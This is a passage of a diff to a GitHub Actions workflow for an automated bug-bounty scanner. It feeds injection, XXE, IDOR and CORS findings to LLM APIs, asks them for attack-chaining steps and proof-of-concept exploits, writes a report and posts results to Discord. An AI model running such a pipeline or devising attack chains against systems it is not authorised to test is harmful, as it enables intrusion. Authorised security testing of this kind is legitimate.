+          rd="results/"+os.environ.get("TIMESTAMP",""); target=os.environ.get("TARGET","")
+          providers=[]
+          if os.environ.get("ANTHROPIC_API_KEY",""): providers.append({"name":"Anthropic","url":"https://api.anthropic.com/v1/messages","headers":{"x-api-key":os.environ["ANTHROPIC_API_KEY"],"anthropic-version":"2023-06-01","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":"claude-sonnet-4-20250514","max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["content"][0]["text"]})
+          if os.environ.get("OPENROUTER_API_KEY",""): providers.append({"name":"OpenRouter","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":"anthropic/claude-sonnet","max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("GROQ_API_KEY",""): providers.append({"name":"Groq","url":"https://api.groq.com/openai/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['GROQ_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":"llama3-70b-8192","max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          def rf(path,cap=2000):
+              try:
+                  with open(os.path.join(rd,path)) as f: return f.read()[:cap]
+              except: return ""
+          inj=rf("ai_agent/injection_findings.json",3000); xxe=rf("ai_agent/xxe_findings.txt"); gql=rf("ai_agent/graphql_findings.txt"); idor=rf("ai_agent/idor_findings.txt"); sens=rf("files/sensitive.txt"); cors=rf("cors/vulnerable.txt")
+          has=any(v.strip() not in ("","No XXE findings","No GraphQL findings","No IDOR findings") for v in [inj,xxe,gql,idor,sens,cors])
+          if not has or not providers:
+              with open(os.path.join(rd,"ai_agent","chained_analysis.json"),"w") as f: json.dump({"message":"No findings to chain-analyze"},f,indent=2)
+              print("ℹ️ No findings - skip"); sys.exit(0)
+          prompt=f"Analyze for {target}:\nINJECTIONS:{inj}\nXXE:{xxe}\nGRAPHQL:{gql}\nIDOR:{idor}\nSENSITIVE:{sens}\nCORS:{cors}\nReturn JSON:{{\"chaining_opportunities\":[{{\"chain\":\"\",\"impact\":\"critical\",\"steps\":[\"\"]}}],\"confirmed_findings\":[{{\"finding\":\"\",\"poc\":\"\",\"impact\":\"\"}}],\"priority_recommendations\":[\"\"]}}"
+          ok=False
+          for p in providers:
+              try:
+                  print(f"  -> {p['name']}...")
+                  req=urllib.request.Request(p["url"],data=p["body_tpl"](prompt),headers=p["headers"],method="POST")
+                  with urllib.request.urlopen(req,timeout=120) as r: res=json.loads(r.read())
+                  text=p["extract"](res); m=re.search(r'\{.*\}',text,re.DOTALL)
+                  if m:
+                      with open(os.path.join(rd,"ai_agent","chained_analysis.json"),"w") as f: f.write(m.group(0))
+                      print(f"✅ Chain via {p['name']}"); ok=True; break
+              except Exception as e: print(f"⚠️ {p['name']}: {e}"); continue
+          if not ok: print("❌ All providers failed for chain")
+          PYEOF
+
+      - name: "📋 AI Final Security Report"
+        continue-on-error: true
+        timeout-minutes: 8
+        run: |
+          python3 << 'PYEOF'
+          import json, os, sys, urllib.request, urllib.error, re, datetime
+          rd="results/"+os.environ.get("TIMESTAMP",""); target=os.environ.get("TARGET","")
+          providers=[]
+          if os.environ.get("ANTHROPIC_API_KEY",""): providers.append({"name":"Anthropic","url":"https://api.anthropic.com/v1/messages","headers":{"x-api-key":os.environ["ANTHROPIC_API_KEY"],"anthropic-version":"2023-06-01","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":"claude-sonnet-4-20250514","max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["content"][0]["text"]})
+          if os.environ.get("OPENROUTER_API_KEY",""): providers.append({"name":"OpenRouter","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":"anthropic/claude-sonnet","max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("GROQ_API_KEY",""): providers.append({"name":"Groq","url":"https://api.groq.com/openai/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['GROQ_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":"llama3-70b-8192","max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          def rf(path,cap=3000):
+              try:
+                  with open(os.path.join(rd,path)) as f: return f.read()[:cap]
+              except: return "N/A"
+          inj=rf("ai_agent/injection_findings.json",3000); xxe=rf("ai_agent/xxe_findings.txt"); gql=rf("ai_agent/graphql_findings.txt"); idor=rf("ai_agent/idor_findings.txt"); chain=rf("ai_agent/chained_analysis.json",2000); nuc=rf("nuclei/findings.jsonl",2000); cors=rf("cors/vulnerable.txt"); sens=rf("files/sensitive.txt"); tako=rf("nuclei/takeover.jsonl",1000)
+          core=[inj,xxe,gql,idor,nuc,cors,sens]
+          has=any(v.strip() not in ("N/A","","No XXE findings","No GraphQL findings","No IDOR findings") for v in core)
+          if not has or not providers:
+              rpt=f"# Security Report: {target}\n**{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}**\n\n## No Confirmed Vulnerabilities\nClean scan."
+              os.makedirs(os.path.join(rd,"ai"),exist_ok=True)
+              with open(os.path.join(rd,"ai","security_report.md"),"w") as f: f.write(rpt)
+              print("📄 Clean report"); sys.exit(0)
+          prompt=f"""Senior bug bounty hunter writing FINAL report for {target}.
+          INJECTIONS:{inj}|XXE:{xxe}|GRAPHQL:{gql}|IDOR:{idor}|CHAIN:{chain}
+          NUCLEI:{nuc}|CORS:{cors}|SENSITIVE:{sens}|TAKEOVER:{tako}
+          Write professional report: # Executive Summary\n# Findings (ONLY confirmed)\n## [Severity] Title | Type: | URL: | Severity: | Steps: | PoC: | Impact: | Remediation: |\n# Chaining\n# Statistics\n# Top 5 Recommendations"""
+          ok=False
+          for p in providers:
+              try:
+                  print(f"  -> {p['name']}...")
+                  req=urllib.request.Request(p["url"],data=p["body_tpl"](prompt),headers=p["headers"],method="POST")
+                  with urllib.request.urlopen(req,timeout=120) as r: res=json.loads(r.read())
+                  text=p["extract"](res)
+                  os.makedirs(os.path.join(rd,"ai"),exist_ok=True)
+                  with open(os.path.join(rd,"ai","security_report.md"),"w") as f: f.write(f"# AI Security Report: {target}\n\n{text}")
+                  print(f"✅ Report ({len(text)} chars) via {p['name']}"); ok=True; break
+              except Exception as e: print(f"⚠️ {p['name']}: {e}"); continue
+          if not ok: print("❌ All providers failed for report")
+          PYEOF
+
+      - name: "🔢 Count Total Findings"
+        id: count_findings
+        if: always()
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INJECT=$(grep -cE '\[(XSS|SSTI|SQLi|LFI|SSRF|Command|Redirect)\]' "$RD/ai_agent/injection_findings.txt" 2>/dev/null || echo 0)
+          XXE=$(grep -c '\[XXE\]' "$RD/ai_agent/xxe_findings.txt" 2>/dev/null || echo 0)
+          GQL=$(grep -c '\[GRAPHQL' "$RD/ai_agent/graphql_findings.txt" 2>/dev/null || echo 0)
+          IDOR=$(grep -c '\[IDOR\]' "$RD/ai_agent/idor_findings.txt" 2>/dev/null || echo 0)
+          NUCLEI=$(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || echo 0)
+          SENS=$(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || echo 0)
+          CORS=$(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || echo 0)
+          TOTAL=$(( INJECT + XXE + GQL + IDOR + NUCLEI + SENS + CORS ))
+          echo "finding_count=$TOTAL" >> "$GITHUB_OUTPUT"
+          echo "🔢 Total findings: $TOTAL"
+
+      - name: "📦 Upload Toolchain Artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: toolchain-${{ env.TIMESTAMP }}
+          path: /tmp/toolbin/
+          retention-days: 7
+          if-no-files-found: ignore
+
+      - name: "📤 Upload Results Artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: results-${{ env.TIMESTAMP }}-${{ env.TARGET }}
+          path: results/${{ env.TIMESTAMP }}/
+          retention-days: 30
+
+      - name: "📣 Discord Notification"
+        if: ${{ always() && inputs.discord_notify == 'true' && env.DISCORD_WEBHOOK != '' }}
+        timeout-minutes: 3
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          SUBS=$(wc -l < "$RD/subdomains/all_subs.txt" 2>/dev/null || echo 0)
+          LIVE=$(wc -l < "$RD/live/live.txt" 2>/dev/null || echo 0)
+          INJECT=$(grep -cE '\[(XSS|SSTI|SQLi|LFI|SSRF|Command|Redirect)\]' "$RD/ai_agent/injection_findings.txt" 2>/dev/null || echo 0)
+          XXE=$(grep -c '\[XXE\]' "$RD/ai_agent/xxe_findings.txt" 2>/dev/null || echo 0)
+          GQL=$(grep -c '\[GRAPHQL' "$RD/ai_agent/graphql_findings.txt" 2>/dev/null || echo 0)
+          IDOR=$(grep -c '\[IDOR\]' "$RD/ai_agent/idor_findings.txt" 2>/dev/null || echo 0)
+          NUCLEI=$(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || echo 0)
+          SENS=$(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || echo 0)
+          CORS=$(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || echo 0)
+          TOTAL_AGENT=$(( INJECT + XXE + GQL + IDOR ))
+
+          COLOR=5814783; TITLE="✅ Scan Complete"
+          if [ "$TOTAL_AGENT" -gt 0 ] || [ "$SENS" -gt 0 ] || [ "$CORS" -gt 0 ]; then
+            COLOR=15158332; TITLE="🚨 Vulnerabilities Found"
+          elif [ "$NUCLEI" -gt 5 ]; then
+            COLOR=16744192; TITLE="🔶 Findings Require Review"
+          fi
+
+          jq -n \
+            --arg t "${{ env.TARGET }}" \
+            --arg title "$TITLE" \
+            --arg subs "$SUBS" \
+            --arg live "$LIVE" \
+            --arg inject "$INJECT" \
+            --arg xxe "$XXE" \
+            --arg gql "$GQL" \
+            --arg idor "$IDOR" \
+            --arg nuclei "$NUCLEI" \
+            --arg sens "$SENS" \
+            --arg cors "$CORS" \
+            --arg run "${{ github.run_number }}" \
+            --arg url "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
+            --argjson color "$COLOR" \
+          '{
+            username:"🎯 BugHunter AI",
+            embeds:[{
+              title:($title+": "+$t), color:$color, url:$url,
+              fields:[
+                {name:"🌐 Recon", value:("Subs: **"+$subs+"** | Live: **"+$live+"**"), inline:false},
+                {name:"🧠 AI Agent", value:("Injections: **"+$inject+"** | XXE: **"+$xxe+"** | GraphQL: **"+$gql+"** | IDOR: **"+$idor+"**"), inline:false},
+                {name:"🔓 Scanner", value:("Nuclei: **"+$nuclei+"** | Secrets: **"+$sens+"** | CORS: **"+$cors+"**"), inline:false},
+                {name:"🔗 Results", value:("[View Run]("+$url+")"), inline:true}
+              ],
+              footer:{text:("Run #"+$run+" | Mode: ${{ env.HUNTING_MODE }} | AI Autonomous Hunter")}
+            }]
+          }' | curl -s -X POST "${{ env.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" -d @- || true
